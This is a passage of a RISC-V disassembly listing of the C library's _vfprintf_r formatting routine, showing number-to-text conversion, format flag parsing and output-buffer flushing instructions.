   10eba:	0ff10513          	addi	a0,sp,255
   10ebe:	85aa                	mv	a1,a0
   10ec0:	46a9                	li	a3,10
   10ec2:	06300e93          	li	t4,99
   10ec6:	02d7e73b          	remw	a4,a5,a3
   10eca:	862e                	mv	a2,a1
   10ecc:	88be                	mv	a7,a5
   10ece:	15fd                	addi	a1,a1,-1
   10ed0:	0307071b          	addiw	a4,a4,48
   10ed4:	fee60fa3          	sb	a4,-1(a2)
   10ed8:	02d7c7bb          	divw	a5,a5,a3
   10edc:	ff1ec5e3          	blt	t4,a7,10ec6 <_vfprintf_r+0x57e>
   10ee0:	0307879b          	addiw	a5,a5,48
   10ee4:	0ff7f693          	andi	a3,a5,255
   10ee8:	fed58fa3          	sb	a3,-1(a1)
   10eec:	ffe60793          	addi	a5,a2,-2
   10ef0:	00a7e463          	bltu	a5,a0,10ef8 <_vfprintf_r+0x5b0>
   10ef4:	6560106f          	j	1254a <_vfprintf_r+0x1c02>
   10ef8:	0f210713          	addi	a4,sp,242
   10efc:	a019                	j	10f02 <_vfprintf_r+0x5ba>
   10efe:	0007c683          	lbu	a3,0(a5)
   10f02:	00d70023          	sb	a3,0(a4)
   10f06:	0785                	addi	a5,a5,1
   10f08:	0705                	addi	a4,a4,1
   10f0a:	fea79ae3          	bne	a5,a0,10efe <_vfprintf_r+0x5b6>
   10f0e:	10110793          	addi	a5,sp,257
   10f12:	0f210713          	addi	a4,sp,242
   10f16:	8f91                	sub	a5,a5,a2
   10f18:	97ba                	add	a5,a5,a4
   10f1a:	1998                	addi	a4,sp,240
   10f1c:	9f99                	subw	a5,a5,a4
   10f1e:	e13e                	sd	a5,128(sp)
   10f20:	678a                	ld	a5,128(sp)
   10f22:	7682                	ld	a3,32(sp)
   10f24:	4705                	li	a4,1
   10f26:	00f68c3b          	addw	s8,a3,a5
   10f2a:	87e2                	mv	a5,s8
   10f2c:	00d74463          	blt	a4,a3,10f34 <_vfprintf_r+0x5ec>
   10f30:	5a00106f          	j	124d0 <_vfprintf_r+0x1b88>
   10f34:	7746                	ld	a4,112(sp)
   10f36:	00e78c3b          	addw	s8,a5,a4
   10f3a:	67ea                	ld	a5,152(sp)
   10f3c:	fffc4993          	not	s3,s8
   10f40:	43f9d993          	srai	s3,s3,0x3f
   10f44:	bff7f493          	andi	s1,a5,-1025
   10f48:	2481                	sext.w	s1,s1
   10f4a:	013c79b3          	and	s3,s8,s3
   10f4e:	1004e493          	ori	s1,s1,256
   10f52:	2981                	sext.w	s3,s3
   10f54:	e882                	sd	zero,80(sp)
   10f56:	f082                	sd	zero,96(sp)
   10f58:	ec82                	sd	zero,88(sp)
   10f5a:	67ae                	ld	a5,200(sp)
   10f5c:	e399                	bnez	a5,10f62 <_vfprintf_r+0x61a>
   10f5e:	17e0106f          	j	120dc <_vfprintf_r+0x1794>
   10f62:	02d00793          	li	a5,45
   10f66:	0cf10fa3          	sb	a5,223(sp)
   10f6a:	4e81                	li	t4,0
   10f6c:	2985                	addiw	s3,s3,1
   10f6e:	b669                	j	10af8 <_vfprintf_r+0x1b0>
   10f70:	0a10                	addi	a2,sp,272
   10f72:	85d2                	mv	a1,s4
   10f74:	8556                	mv	a0,s5
   10f76:	fc76                	sd	t4,56(sp)
   10f78:	f87e                	sd	t6,48(sp)
   10f7a:	e416                	sd	t0,8(sp)
   10f7c:	78b070ef          	jal	ra,18f06 <__sprint_r>
   10f80:	56051463          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   10f84:	7792                	ld	a5,288(sp)
   10f86:	7ee2                	ld	t4,56(sp)
   10f88:	7fc2                	ld	t6,48(sp)
   10f8a:	62a2                	ld	t0,8(sp)
   10f8c:	835e                	mv	t1,s7
   10f8e:	be5d                	j	10b44 <_vfprintf_r+0x1fc>
   10f90:	76e6                	ld	a3,120(sp)
   10f92:	7746                	ld	a4,112(sp)
   10f94:	0341                	addi	t1,t1,16
   10f96:	fed33823          	sd	a3,-16(t1)
   10f9a:	11812683          	lw	a3,280(sp)
   10f9e:	97ba                	add	a5,a5,a4
   10fa0:	fee33c23          	sd	a4,-8(t1)
   10fa4:	2685                	addiw	a3,a3,1
   10fa6:	0006871b          	sext.w	a4,a3
   10faa:	10d12c23          	sw	a3,280(sp)
   10fae:	f23e                	sd	a5,288(sp)
   10fb0:	469d                	li	a3,7
   10fb2:	00e6de63          	bge	a3,a4,10fce <_vfprintf_r+0x686>
   10fb6:	0a10                	addi	a2,sp,272
   10fb8:	85d2                	mv	a1,s4
   10fba:	8556                	mv	a0,s5
   10fbc:	74b070ef          	jal	ra,18f06 <__sprint_r>
   10fc0:	52051463          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   10fc4:	562e                	lw	a2,232(sp)
   10fc6:	7792                	ld	a5,288(sp)
   10fc8:	11812703          	lw	a4,280(sp)
   10fcc:	835e                	mv	t1,s7
   10fce:	00065463          	bgez	a2,10fd6 <_vfprintf_r+0x68e>
   10fd2:	2a60106f          	j	12278 <_vfprintf_r+0x1930>
   10fd6:	7682                	ld	a3,32(sp)
   10fd8:	2705                	addiw	a4,a4,1
   10fda:	10e12c23          	sw	a4,280(sp)
   10fde:	97b6                	add	a5,a5,a3
   10fe0:	00d33423          	sd	a3,8(t1)
   10fe4:	01933023          	sd	s9,0(t1)
   10fe8:	0007069b          	sext.w	a3,a4
   10fec:	f23e                	sd	a5,288(sp)
   10fee:	471d                	li	a4,7
   10ff0:	bad75be3          	bge	a4,a3,10ba6 <_vfprintf_r+0x25e>
   10ff4:	0a10                	addi	a2,sp,272
   10ff6:	85d2                	mv	a1,s4
   10ff8:	8556                	mv	a0,s5
   10ffa:	70d070ef          	jal	ra,18f06 <__sprint_r>
   10ffe:	4e051563          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11002:	7792                	ld	a5,288(sp)
   11004:	835e                	mv	t1,s7
   11006:	b64d                	j	10ba8 <_vfprintf_r+0x260>
   11008:	0104f793          	andi	a5,s1,16
   1100c:	0e0799e3          	bnez	a5,118fe <_vfprintf_r+0xfb6>
   11010:	66c2                	ld	a3,16(sp)
   11012:	0404f793          	andi	a5,s1,64
   11016:	0006a983          	lw	s3,0(a3)
   1101a:	44078ae3          	beqz	a5,11c6e <_vfprintf_r+0x1326>
   1101e:	19c2                	slli	s3,s3,0x30
   11020:	0309d993          	srli	s3,s3,0x30
   11024:	b1d1                	j	10ce8 <_vfprintf_r+0x3a0>
   11026:	0104f793          	andi	a5,s1,16
   1102a:	0c0795e3          	bnez	a5,118f4 <_vfprintf_r+0xfac>
   1102e:	0404f793          	andi	a5,s1,64
   11032:	40078de3          	beqz	a5,11c4c <_vfprintf_r+0x1304>
   11036:	67c2                	ld	a5,16(sp)
   11038:	00079983          	lh	s3,0(a5)
   1103c:	87ce                	mv	a5,s3
   1103e:	c407d8e3          	bgez	a5,10c8e <_vfprintf_r+0x346>
   11042:	02d00793          	li	a5,45
   11046:	0cf10fa3          	sb	a5,223(sp)
   1104a:	e83a                	sd	a4,16(sp)
   1104c:	577d                	li	a4,-1
   1104e:	413009b3          	neg	s3,s3
   11052:	8826                	mv	a6,s1
   11054:	4785                	li	a5,1
   11056:	caee94e3          	bne	t4,a4,10cfe <_vfprintf_r+0x3b6>
   1105a:	4705                	li	a4,1
   1105c:	56e78463          	beq	a5,a4,115c4 <_vfprintf_r+0xc7c>
   11060:	4709                	li	a4,2
   11062:	28e78263          	beq	a5,a4,112e6 <_vfprintf_r+0x99e>
   11066:	18c10c13          	addi	s8,sp,396
   1106a:	8ce2                	mv	s9,s8
   1106c:	0079f793          	andi	a5,s3,7
   11070:	03078793          	addi	a5,a5,48
   11074:	fefc8fa3          	sb	a5,-1(s9)
   11078:	0039d993          	srli	s3,s3,0x3
   1107c:	8766                	mv	a4,s9
   1107e:	1cfd                	addi	s9,s9,-1
   11080:	fe0996e3          	bnez	s3,1106c <_vfprintf_r+0x724>
   11084:	00187693          	andi	a3,a6,1
   11088:	26068f63          	beqz	a3,11306 <_vfprintf_r+0x9be>
   1108c:	03000693          	li	a3,48
   11090:	26d78b63          	beq	a5,a3,11306 <_vfprintf_r+0x9be>
   11094:	1779                	addi	a4,a4,-2
   11096:	fedc8fa3          	sb	a3,-1(s9)
   1109a:	40ec0c3b          	subw	s8,s8,a4
   1109e:	84c2                	mv	s1,a6
   110a0:	8cba                	mv	s9,a4
   110a2:	b139                	j	10cb0 <_vfprintf_r+0x368>
   110a4:	8556                	mv	a0,s5
   110a6:	33f010ef          	jal	ra,12be4 <__sinit>
   110aa:	b8fd                	j	109a8 <_vfprintf_r+0x60>
   110ac:	67c2                	ld	a5,16(sp)
   110ae:	0c010fa3          	sb	zero,223(sp)
   110b2:	0007bc83          	ld	s9,0(a5)
   110b6:	00878693          	addi	a3,a5,8
   110ba:	1c0c85e3          	beqz	s9,11a84 <_vfprintf_r+0x113c>
   110be:	57fd                	li	a5,-1
   110c0:	34fe82e3          	beq	t4,a5,11c04 <_vfprintf_r+0x12bc>
   110c4:	8676                	mv	a2,t4
   110c6:	4581                	li	a1,0
   110c8:	8566                	mv	a0,s9
   110ca:	f836                	sd	a3,48(sp)
   110cc:	e81a                	sd	t1,16(sp)
   110ce:	e476                	sd	t4,8(sp)
   110d0:	3ab040ef          	jal	ra,15c7a <memchr>
   110d4:	ec2a                	sd	a0,24(sp)
   110d6:	6ea2                	ld	t4,8(sp)
   110d8:	6342                	ld	t1,16(sp)
   110da:	76c2                	ld	a3,48(sp)
   110dc:	e119                	bnez	a0,110e2 <_vfprintf_r+0x79a>
   110de:	1120106f          	j	121f0 <_vfprintf_r+0x18a8>
   110e2:	67e2                	ld	a5,24(sp)
   110e4:	e836                	sd	a3,16(sp)
   110e6:	ec02                	sd	zero,24(sp)
   110e8:	41978c3b          	subw	s8,a5,s9
   110ec:	fffc4993          	not	s3,s8
   110f0:	0df14783          	lbu	a5,223(sp)
   110f4:	43f9d993          	srai	s3,s3,0x3f
   110f8:	013c79b3          	and	s3,s8,s3
   110fc:	e882                	sd	zero,80(sp)
   110fe:	f082                	sd	zero,96(sp)
   11100:	ec82                	sd	zero,88(sp)
   11102:	2981                	sext.w	s3,s3
   11104:	4e81                	li	t4,0
   11106:	bc0793e3          	bnez	a5,10ccc <_vfprintf_r+0x384>
   1110a:	b2fd                	j	10af8 <_vfprintf_r+0x1b0>
   1110c:	6742                	ld	a4,16(sp)
   1110e:	0c010fa3          	sb	zero,223(sp)
   11112:	4985                	li	s3,1
   11114:	431c                	lw	a5,0(a4)
   11116:	0721                	addi	a4,a4,8
   11118:	e83a                	sd	a4,16(sp)
   1111a:	12f10423          	sb	a5,296(sp)
   1111e:	4c05                	li	s8,1
   11120:	12810c93          	addi	s9,sp,296
   11124:	b2e9                	j	10aee <_vfprintf_r+0x1a6>
   11126:	00044f03          	lbu	t5,0(s0)
   1112a:	0044e493          	ori	s1,s1,4
   1112e:	2481                	sext.w	s1,s1
   11130:	b2b1                	j	10a7c <_vfprintf_r+0x134>
   11132:	02b00793          	li	a5,43
   11136:	00044f03          	lbu	t5,0(s0)
   1113a:	0cf10fa3          	sb	a5,223(sp)
   1113e:	ba3d                	j	10a7c <_vfprintf_r+0x134>
   11140:	0804e493          	ori	s1,s1,128
   11144:	00044f03          	lbu	t5,0(s0)
   11148:	2481                	sext.w	s1,s1
   1114a:	ba0d                	j	10a7c <_vfprintf_r+0x134>
   1114c:	00044703          	lbu	a4,0(s0)
   11150:	00140793          	addi	a5,s0,1
   11154:	00070d9b          	sext.w	s11,a4
   11158:	00ec1463          	bne	s8,a4,11160 <_vfprintf_r+0x818>
   1115c:	3d20106f          	j	1252e <_vfprintf_r+0x1be6>
   11160:	fd07071b          	addiw	a4,a4,-48
   11164:	843e                	mv	s0,a5
   11166:	4e81                	li	t4,0
   11168:	90e9efe3          	bltu	s3,a4,10a86 <_vfprintf_r+0x13e>
   1116c:	00044d83          	lbu	s11,0(s0)
   11170:	002e979b          	slliw	a5,t4,0x2
   11174:	01d78ebb          	addw	t4,a5,t4
   11178:	001e9e9b          	slliw	t4,t4,0x1
   1117c:	00ee8ebb          	addw	t4,t4,a4
   11180:	fd0d871b          	addiw	a4,s11,-48
   11184:	0405                	addi	s0,s0,1
   11186:	fee9f3e3          	bgeu	s3,a4,1116c <_vfprintf_r+0x824>
   1118a:	b8f5                	j	10a86 <_vfprintf_r+0x13e>
   1118c:	67c2                	ld	a5,16(sp)
   1118e:	00044f03          	lbu	t5,0(s0)
   11192:	0007ab03          	lw	s6,0(a5)
   11196:	07a1                	addi	a5,a5,8
   11198:	e83e                	sd	a5,16(sp)
   1119a:	8e0b51e3          	bgez	s6,10a7c <_vfprintf_r+0x134>
   1119e:	41600b3b          	negw	s6,s6
   111a2:	b761                	j	1112a <_vfprintf_r+0x7e2>
   111a4:	8556                	mv	a0,s5
   111a6:	ec1a                	sd	t1,24(sp)
   111a8:	e476                	sd	t4,8(sp)
   111aa:	2a2040ef          	jal	ra,1544c <_localeconv_r>
   111ae:	651c                	ld	a5,8(a0)
   111b0:	853e                	mv	a0,a5
   111b2:	e93e                	sd	a5,144(sp)
   111b4:	f00ff0ef          	jal	ra,108b4 <strlen>
   111b8:	87aa                	mv	a5,a0
   111ba:	8556                	mv	a0,s5
   111bc:	8dbe                	mv	s11,a5
   111be:	e53e                	sd	a5,136(sp)
   111c0:	28c040ef          	jal	ra,1544c <_localeconv_r>
   111c4:	6918                	ld	a4,16(a0)
   111c6:	6ea2                	ld	t4,8(sp)
   111c8:	6362                	ld	t1,24(sp)
   111ca:	f4ba                	sd	a4,104(sp)
   111cc:	00044f03          	lbu	t5,0(s0)
   111d0:	8a0d86e3          	beqz	s11,10a7c <_vfprintf_r+0x134>
   111d4:	8a0704e3          	beqz	a4,10a7c <_vfprintf_r+0x134>
   111d8:	00074783          	lbu	a5,0(a4)
   111dc:	8a0780e3          	beqz	a5,10a7c <_vfprintf_r+0x134>
   111e0:	4004e493          	ori	s1,s1,1024
   111e4:	2481                	sext.w	s1,s1
   111e6:	b859                	j	10a7c <_vfprintf_r+0x134>
   111e8:	0014e493          	ori	s1,s1,1
   111ec:	00044f03          	lbu	t5,0(s0)
   111f0:	2481                	sext.w	s1,s1
   111f2:	b069                	j	10a7c <_vfprintf_r+0x134>
   111f4:	0df14783          	lbu	a5,223(sp)
   111f8:	00044f03          	lbu	t5,0(s0)
   111fc:	880790e3          	bnez	a5,10a7c <_vfprintf_r+0x134>
   11200:	02000793          	li	a5,32
   11204:	0cf10fa3          	sb	a5,223(sp)
   11208:	b895                	j	10a7c <_vfprintf_r+0x134>
   1120a:	0084e493          	ori	s1,s1,8
   1120e:	00044f03          	lbu	t5,0(s0)
   11212:	2481                	sext.w	s1,s1
   11214:	b0a5                	j	10a7c <_vfprintf_r+0x134>
   11216:	0104e493          	ori	s1,s1,16
   1121a:	0004881b          	sext.w	a6,s1
   1121e:	66c2                	ld	a3,16(sp)
   11220:	02087793          	andi	a5,a6,32
   11224:	00868713          	addi	a4,a3,8
   11228:	68078463          	beqz	a5,118b0 <_vfprintf_r+0xf68>
   1122c:	0006b983          	ld	s3,0(a3)
   11230:	4785                	li	a5,1
   11232:	e83a                	sd	a4,16(sp)
   11234:	b4c1                	j	10cf4 <_vfprintf_r+0x3ac>
   11236:	0204e493          	ori	s1,s1,32
   1123a:	00044f03          	lbu	t5,0(s0)
   1123e:	2481                	sext.w	s1,s1
   11240:	83dff06f          	j	10a7c <_vfprintf_r+0x134>
   11244:	6742                	ld	a4,16(sp)
   11246:	77e1                	lui	a5,0xffff8
   11248:	8307c793          	xori	a5,a5,-2000
   1124c:	0ef11023          	sh	a5,224(sp)
   11250:	00870793          	addi	a5,a4,8
   11254:	0024e493          	ori	s1,s1,2
   11258:	e83e                	sd	a5,16(sp)
   1125a:	0000b797          	auipc	a5,0xb
   1125e:	4ae78793          	addi	a5,a5,1198 # 1c708 <__clzdi2+0x1b4>
   11262:	f43e                	sd	a5,40(sp)
   11264:	00073983          	ld	s3,0(a4)
   11268:	0004881b          	sext.w	a6,s1
   1126c:	4789                	li	a5,2
   1126e:	07800d93          	li	s11,120
   11272:	b449                	j	10cf4 <_vfprintf_r+0x3ac>
   11274:	66c2                	ld	a3,16(sp)
   11276:	0204f793          	andi	a5,s1,32
   1127a:	6298                	ld	a4,0(a3)
   1127c:	06a1                	addi	a3,a3,8
   1127e:	e836                	sd	a3,16(sp)
   11280:	64079e63          	bnez	a5,118dc <_vfprintf_r+0xf94>
   11284:	0104f793          	andi	a5,s1,16
   11288:	64079a63          	bnez	a5,118dc <_vfprintf_r+0xf94>
   1128c:	0404f793          	andi	a5,s1,64
   11290:	3e0799e3          	bnez	a5,11e82 <_vfprintf_r+0x153a>
   11294:	2004f493          	andi	s1,s1,512
   11298:	6782                	ld	a5,0(sp)
   1129a:	e099                	bnez	s1,112a0 <_vfprintf_r+0x958>
   1129c:	1280106f          	j	123c4 <_vfprintf_r+0x1a7c>
   112a0:	00f70023          	sb	a5,0(a4)
   112a4:	8ca2                	mv	s9,s0
   112a6:	ba15                	j	10bda <_vfprintf_r+0x292>
   112a8:	00044f03          	lbu	t5,0(s0)
   112ac:	06c00793          	li	a5,108
   112b0:	7aff0263          	beq	t5,a5,11a54 <_vfprintf_r+0x110c>
   112b4:	0104e493          	ori	s1,s1,16
   112b8:	2481                	sext.w	s1,s1
   112ba:	fc2ff06f          	j	10a7c <_vfprintf_r+0x134>
   112be:	00044f03          	lbu	t5,0(s0)
   112c2:	06800793          	li	a5,104
   112c6:	76ff0f63          	beq	t5,a5,11a44 <_vfprintf_r+0x10fc>
   112ca:	0404e493          	ori	s1,s1,64
   112ce:	2481                	sext.w	s1,s1
   112d0:	facff06f          	j	10a7c <_vfprintf_r+0x134>
   112d4:	4705                	li	a4,1
   112d6:	00e79463          	bne	a5,a4,112de <_vfprintf_r+0x996>
   112da:	0220106f          	j	122fc <_vfprintf_r+0x19b4>
   112de:	4709                	li	a4,2
   112e0:	8826                	mv	a6,s1
   112e2:	d8e792e3          	bne	a5,a4,11066 <_vfprintf_r+0x71e>
   112e6:	18c10c13          	addi	s8,sp,396
   112ea:	8ce2                	mv	s9,s8
   112ec:	7722                	ld	a4,40(sp)
   112ee:	00f9f793          	andi	a5,s3,15
   112f2:	1cfd                	addi	s9,s9,-1
   112f4:	97ba                	add	a5,a5,a4
   112f6:	0007c783          	lbu	a5,0(a5)
   112fa:	0049d993          	srli	s3,s3,0x4
   112fe:	00fc8023          	sb	a5,0(s9)
   11302:	fe0995e3          	bnez	s3,112ec <_vfprintf_r+0x9a4>
   11306:	419c0c3b          	subw	s8,s8,s9
   1130a:	84c2                	mv	s1,a6
   1130c:	b255                	j	10cb0 <_vfprintf_r+0x368>
   1130e:	06500713          	li	a4,101
   11312:	1fb75463          	bge	a4,s11,114fa <_vfprintf_r+0xbb2>
   11316:	6512                	ld	a0,256(sp)
   11318:	65b2                	ld	a1,264(sp)
   1131a:	4601                	li	a2,0
   1131c:	4681                	li	a3,0
   1131e:	f83e                	sd	a5,48(sp)
   11320:	e41a                	sd	t1,8(sp)
   11322:	65d090ef          	jal	ra,1b17e <__eqtf2>
   11326:	6322                	ld	t1,8(sp)
   11328:	77c2                	ld	a5,48(sp)
   1132a:	3e051b63          	bnez	a0,11720 <_vfprintf_r+0xdd8>
   1132e:	11812703          	lw	a4,280(sp)
   11332:	0000b697          	auipc	a3,0xb
   11336:	3f668693          	addi	a3,a3,1014 # 1c728 <__clzdi2+0x1d4>
   1133a:	00d33023          	sd	a3,0(t1)
   1133e:	2705                	addiw	a4,a4,1
   11340:	4685                	li	a3,1
   11342:	0785                	addi	a5,a5,1
   11344:	00d33423          	sd	a3,8(t1)
   11348:	10e12c23          	sw	a4,280(sp)
   1134c:	0007069b          	sext.w	a3,a4
   11350:	f23e                	sd	a5,288(sp)
   11352:	471d                	li	a4,7
   11354:	0341                	addi	t1,t1,16
   11356:	04d742e3          	blt	a4,a3,11b9a <_vfprintf_r+0x1252>
   1135a:	572e                	lw	a4,232(sp)
   1135c:	7682                	ld	a3,32(sp)
   1135e:	56d75a63          	bge	a4,a3,118d2 <_vfprintf_r+0xf8a>
   11362:	7766                	ld	a4,120(sp)
   11364:	76c6                	ld	a3,112(sp)
   11366:	0341                	addi	t1,t1,16
   11368:	fee33823          	sd	a4,-16(t1)
   1136c:	11812703          	lw	a4,280(sp)
   11370:	97b6                	add	a5,a5,a3
   11372:	fed33c23          	sd	a3,-8(t1)
   11376:	2705                	addiw	a4,a4,1
   11378:	0007069b          	sext.w	a3,a4
   1137c:	10e12c23          	sw	a4,280(sp)
   11380:	f23e                	sd	a5,288(sp)
   11382:	471d                	li	a4,7
   11384:	6ed74063          	blt	a4,a3,11a64 <_vfprintf_r+0x111c>
   11388:	7702                	ld	a4,32(sp)
   1138a:	fff70c1b          	addiw	s8,a4,-1
   1138e:	81805de3          	blez	s8,10ba8 <_vfprintf_r+0x260>
   11392:	11812703          	lw	a4,280(sp)
   11396:	018d5de3          	bge	s10,s8,11bb0 <_vfprintf_r+0x1268>
   1139a:	4c9d                	li	s9,7
   1139c:	a021                	j	113a4 <_vfprintf_r+0xa5c>
   1139e:	3c41                	addiw	s8,s8,-16
   113a0:	018d58e3          	bge	s10,s8,11bb0 <_vfprintf_r+0x1268>
   113a4:	2705                	addiw	a4,a4,1
   113a6:	07c1                	addi	a5,a5,16
   113a8:	01233023          	sd	s2,0(t1)
   113ac:	01a33423          	sd	s10,8(t1)
   113b0:	f23e                	sd	a5,288(sp)
   113b2:	10e12c23          	sw	a4,280(sp)
   113b6:	0341                	addi	t1,t1,16
   113b8:	feecd3e3          	bge	s9,a4,1139e <_vfprintf_r+0xa56>
   113bc:	0a10                	addi	a2,sp,272
   113be:	85d2                	mv	a1,s4
   113c0:	8556                	mv	a0,s5
   113c2:	345070ef          	jal	ra,18f06 <__sprint_r>
   113c6:	12051163          	bnez	a0,114e8 <_vfprintf_r+0xba0>
   113ca:	7792                	ld	a5,288(sp)
   113cc:	11812703          	lw	a4,280(sp)
   113d0:	835e                	mv	t1,s7
   113d2:	b7f1                	j	1139e <_vfprintf_r+0xa56>
   113d4:	413b06bb          	subw	a3,s6,s3
   113d8:	f8d05f63          	blez	a3,10b76 <_vfprintf_r+0x22e>
   113dc:	11812703          	lw	a4,280(sp)
   113e0:	04dd5563          	bge	s10,a3,1142a <_vfprintf_r+0xae2>
   113e4:	489d                	li	a7,7
   113e6:	a021                	j	113ee <_vfprintf_r+0xaa6>
   113e8:	36c1                	addiw	a3,a3,-16
   113ea:	04dd5063          	bge	s10,a3,1142a <_vfprintf_r+0xae2>
   113ee:	2705                	addiw	a4,a4,1
   113f0:	07c1                	addi	a5,a5,16
   113f2:	01233023          	sd	s2,0(t1)
   113f6:	01a33423          	sd	s10,8(t1)
   113fa:	f23e                	sd	a5,288(sp)
   113fc:	10e12c23          	sw	a4,280(sp)
   11400:	0341                	addi	t1,t1,16
   11402:	fee8d3e3          	bge	a7,a4,113e8 <_vfprintf_r+0xaa0>
   11406:	0a10                	addi	a2,sp,272
   11408:	85d2                	mv	a1,s4
   1140a:	8556                	mv	a0,s5
   1140c:	f836                	sd	a3,48(sp)
   1140e:	e476                	sd	t4,8(sp)
   11410:	2f7070ef          	jal	ra,18f06 <__sprint_r>
   11414:	e971                	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11416:	76c2                	ld	a3,48(sp)
   11418:	7792                	ld	a5,288(sp)
   1141a:	11812703          	lw	a4,280(sp)
   1141e:	36c1                	addiw	a3,a3,-16
   11420:	6ea2                	ld	t4,8(sp)
   11422:	835e                	mv	t1,s7
   11424:	489d                	li	a7,7
   11426:	fcdd44e3          	blt	s10,a3,113ee <_vfprintf_r+0xaa6>
   1142a:	2705                	addiw	a4,a4,1
   1142c:	97b6                	add	a5,a5,a3
   1142e:	00d33423          	sd	a3,8(t1)
   11432:	01233023          	sd	s2,0(t1)
   11436:	0007069b          	sext.w	a3,a4
   1143a:	10e12c23          	sw	a4,280(sp)
   1143e:	f23e                	sd	a5,288(sp)
   11440:	471d                	li	a4,7
   11442:	0341                	addi	t1,t1,16
   11444:	f2d75963          	bge	a4,a3,10b76 <_vfprintf_r+0x22e>
   11448:	0a10                	addi	a2,sp,272
   1144a:	85d2                	mv	a1,s4
   1144c:	8556                	mv	a0,s5
   1144e:	e476                	sd	t4,8(sp)
   11450:	2b7070ef          	jal	ra,18f06 <__sprint_r>
   11454:	e951                	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11456:	7792                	ld	a5,288(sp)
   11458:	6ea2                	ld	t4,8(sp)
   1145a:	835e                	mv	t1,s7
   1145c:	f1aff06f          	j	10b76 <_vfprintf_r+0x22e>
   11460:	11812703          	lw	a4,280(sp)
   11464:	05dd5363          	bge	s10,t4,114aa <_vfprintf_r+0xb62>
   11468:	489d                	li	a7,7
   1146a:	a021                	j	11472 <_vfprintf_r+0xb2a>
   1146c:	3ec1                	addiw	t4,t4,-16
   1146e:	03dd5e63          	bge	s10,t4,114aa <_vfprintf_r+0xb62>
   11472:	2705                	addiw	a4,a4,1
   11474:	07c1                	addi	a5,a5,16
   11476:	01233023          	sd	s2,0(t1)
   1147a:	01a33423          	sd	s10,8(t1)
   1147e:	f23e                	sd	a5,288(sp)
   11480:	10e12c23          	sw	a4,280(sp)
   11484:	0341                	addi	t1,t1,16
   11486:	fee8d3e3          	bge	a7,a4,1146c <_vfprintf_r+0xb24>
   1148a:	0a10                	addi	a2,sp,272
   1148c:	85d2                	mv	a1,s4
   1148e:	8556                	mv	a0,s5
   11490:	e476                	sd	t4,8(sp)
   11492:	275070ef          	jal	ra,18f06 <__sprint_r>
   11496:	e929                	bnez	a0,114e8 <_vfprintf_r+0xba0>
   11498:	6ea2                	ld	t4,8(sp)
   1149a:	7792                	ld	a5,288(sp)
   1149c:	11812703          	lw	a4,280(sp)
   114a0:	3ec1                	addiw	t4,t4,-16
   114a2:	835e                	mv	t1,s7
   114a4:	489d                	li	a7,7
   114a6:	fddd46e3          	blt	s10,t4,11472 <_vfprintf_r+0xb2a>
   114aa:	0017069b          	addiw	a3,a4,1
   114ae:	97f6                	add	a5,a5,t4
   114b0:	01233023          	sd	s2,0(t1)
   114b4:	01d33423          	sd	t4,8(t1)
   114b8:	f23e                	sd	a5,288(sp)
   114ba:	10d12c23          	sw	a3,280(sp)
   114be:	471d                	li	a4,7
   114c0:	0341                	addi	t1,t1,16
   114c2:	ead75e63          	bge	a4,a3,10b7e <_vfprintf_r+0x236>
   114c6:	0a10                	addi	a2,sp,272
   114c8:	85d2                	mv	a1,s4
   114ca:	8556                	mv	a0,s5
   114cc:	23b070ef          	jal	ra,18f06 <__sprint_r>
   114d0:	ed01                	bnez	a0,114e8 <_vfprintf_r+0xba0>
   114d2:	7792                	ld	a5,288(sp)
   114d4:	835e                	mv	t1,s7
   114d6:	ea8ff06f          	j	10b7e <_vfprintf_r+0x236>
   114da:	0a10                	addi	a2,sp,272
   114dc:	85d2                	mv	a1,s4
   114de:	8556                	mv	a0,s5
   114e0:	227070ef          	jal	ra,18f06 <__sprint_r>
   114e4:	ee050163          	beqz	a0,10bc6 <_vfprintf_r+0x27e>
   114e8:	67e2                	ld	a5,24(sp)
   114ea:	f0078063          	beqz	a5,10bea <_vfprintf_r+0x2a2>
   114ee:	85be                	mv	a1,a5
   114f0:	8556                	mv	a0,s5
   114f2:	025010ef          	jal	ra,12d16 <_free_r>
   114f6:	ef4ff06f          	j	10bea <_vfprintf_r+0x2a2>
   114fa:	11812603          	lw	a2,280(sp)
   114fe:	00178d93          	addi	s11,a5,1
   11502:	7782                	ld	a5,32(sp)
   11504:	0016071b          	addiw	a4,a2,1
   11508:	4585                	li	a1,1
   1150a:	01933023          	sd	s9,0(t1)
   1150e:	86ba                	mv	a3,a4
   11510:	01030c13          	addi	s8,t1,16
   11514:	32f5d863          	bge	a1,a5,11844 <_vfprintf_r+0xefc>
   11518:	4605                	li	a2,1
   1151a:	10d12c23          	sw	a3,280(sp)
   1151e:	00c33423          	sd	a2,8(t1)
   11522:	f26e                	sd	s11,288(sp)
   11524:	469d                	li	a3,7
   11526:	5ce6c463          	blt	a3,a4,11aee <_vfprintf_r+0x11a6>
   1152a:	77c6                	ld	a5,112(sp)
   1152c:	0017069b          	addiw	a3,a4,1
   11530:	7766                	ld	a4,120(sp)
   11532:	9dbe                	add	s11,s11,a5
   11534:	00fc3423          	sd	a5,8(s8)
   11538:	00ec3023          	sd	a4,0(s8)
   1153c:	10d12c23          	sw	a3,280(sp)
   11540:	0006871b          	sext.w	a4,a3
   11544:	f26e                	sd	s11,288(sp)
   11546:	469d                	li	a3,7
   11548:	0c41                	addi	s8,s8,16
   1154a:	5ae6ce63          	blt	a3,a4,11b06 <_vfprintf_r+0x11be>
   1154e:	6512                	ld	a0,256(sp)
   11550:	65b2                	ld	a1,264(sp)
   11552:	0017089b          	addiw	a7,a4,1
   11556:	4601                	li	a2,0
   11558:	4681                	li	a3,0
   1155a:	e446                	sd	a7,8(sp)
   1155c:	f83a                	sd	a4,48(sp)
   1155e:	421090ef          	jal	ra,1b17e <__eqtf2>
   11562:	68a2                	ld	a7,8(sp)
   11564:	7782                	ld	a5,32(sp)
   11566:	010c0313          	addi	t1,s8,16
   1156a:	0008861b          	sext.w	a2,a7
   1156e:	fff7869b          	addiw	a3,a5,-1
   11572:	2e050963          	beqz	a0,11864 <_vfprintf_r+0xf1c>
   11576:	9db6                	add	s11,s11,a3
   11578:	001c8813          	addi	a6,s9,1
   1157c:	00dc3423          	sd	a3,8(s8)
   11580:	010c3023          	sd	a6,0(s8)
   11584:	f26e                	sd	s11,288(sp)
   11586:	11112c23          	sw	a7,280(sp)
   1158a:	469d                	li	a3,7
